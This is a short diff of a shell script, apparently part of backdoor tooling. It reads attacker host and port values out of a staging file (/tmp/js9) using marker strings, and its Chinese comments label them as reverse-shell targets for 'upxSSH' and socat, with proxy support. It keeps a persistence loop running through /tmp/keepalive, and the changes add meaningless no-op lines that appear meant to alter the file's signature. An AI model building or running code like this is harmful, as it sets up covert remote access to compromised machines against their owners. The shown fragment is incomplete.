@@ -49,6 +49,7 @@ echo "flag_9832q $ip_port7pxy2a";
 
 
 
+sleep 2;
 
 (while true; do
         [ ! -f /tmp/keepalive ] && break        
@@ -57,11 +58,11 @@ echo "flag_9832q $ip_port7pxy2a";
          num76=$((${num67z}%8));
          bport=5005"$num76";echo $bport >> /tmp/keepalive;
 # 提取反弹upxSSH的主机和端口
-ip_port5=$(grep -oP "(?<=AABBCC_rev_shellLLL).*(?=FFF)" /tmp/js9)
+ip_port5=$(grep -oP "(?<=AABBCC_rev_shellLLL).*(?=FFF)" /tmp/js9;echo 456891 >/dev/null)
 port5=${ip_port5#*:};
 ip5=${ip_port5%:*};
 # 提取反弹socat的主机和端口，支持代理(ip7)
-ip_port7pxy=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9;echo 456891>/dev/null);
+ip_port7pxy=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9;echo 456891 >/dev/null);
 echo "flag_9832";
 [ ! -z ${ip_port7pxy} ] && port7pxy=${ip_port7pxy#*:};
 ip7pxy=${ip_port7pxy%:*};
